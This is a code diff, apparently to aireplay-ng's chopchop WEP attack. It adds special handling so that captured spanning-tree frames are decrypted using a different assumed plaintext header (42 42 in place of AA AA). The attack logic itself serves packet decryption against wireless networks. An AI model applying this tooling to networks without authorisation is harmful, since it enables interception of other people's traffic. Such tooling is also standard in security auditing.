@@ -53,6 +53,7 @@
 
 #define NULL_MAC        "\x00\x00\x00\x00\x00\x00"
 #define BROADCAST       "\xFF\xFF\xFF\xFF\xFF\xFF"
+#define SPANTREE        "\x01\x80\xC2\x00\x00\x00"
 
 #define ARPHRD_IEEE80211        801
 #define ARPHRD_IEEE80211_PRISM  802
@@ -2044,6 +2045,9 @@ int do_attack_chopchop( void )
     int data_start, data_end;
     int guess, is_deauth_mode;
     int nb_bad_pkt;
+    
+    unsigned char b1 = 0xAA;
+    unsigned char b2 = 0xAA;
 
     FILE *f_cap_out;
     long nb_pkt_read;
@@ -2060,10 +2064,18 @@ int do_attack_chopchop( void )
     if( capture_ask_packet( &caplen ) != 0 )
         return( 1 );
 
+    /* Special handling for spanning-tree packets */
+    if ( memcmp( h80211 +  4, SPANTREE, 6 ) == 0 ||
+        memcmp( h80211 + 16, SPANTREE, 6 ) == 0 )
+    {
+        b1 = 0x42; b2 = 0x42;
+    }
+
     printf( "\n" );
 
     /* chopchop operation mode: truncate and decrypt the packet */
     /* we assume the plaintext starts with  AA AA 03 00 00 00   */
+    /* (42 42 03 00 00 00 for spanning-tree packets)            */
 
     memcpy( srcbuf, h80211, caplen );
 
@@ -2113,8 +2125,8 @@ int do_attack_chopchop( void )
     {
         switch( i - data_start )
         {
-            case  0: chopped[i] = 0xAA ^ 0xE0; break;
-            case  1: chopped[i] = 0xAA ^ 0xE0; break;
+            case  0: chopped[i] = b1 ^ 0xE0; break;
+            case  1: chopped[i] = b2 ^ 0xE0; break;
             case  2: chopped[i] = 0x03 ^ 0x03; break;
             default: chopped[i] = 0x55 ^ ( i & 0xFF ); break;
         }
@@ -2511,8 +2523,8 @@ int do_attack_chopchop( void )
 
     z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
 
-    chopped[z + 4] = srcbuf[z + 4] ^ 0xAA;
-    chopped[z + 5] = srcbuf[z + 5] ^ 0xAA;
+    chopped[z + 4] = srcbuf[z + 4] ^ b1;
+    chopped[z + 5] = srcbuf[z + 5] ^ b2;
     chopped[z + 6] = srcbuf[z + 6] ^ 0x03;
     chopped[z + 7] = srcbuf[z + 7] ^ 0x00;
     chopped[z + 8] = srcbuf[z + 8] ^ 0x00;
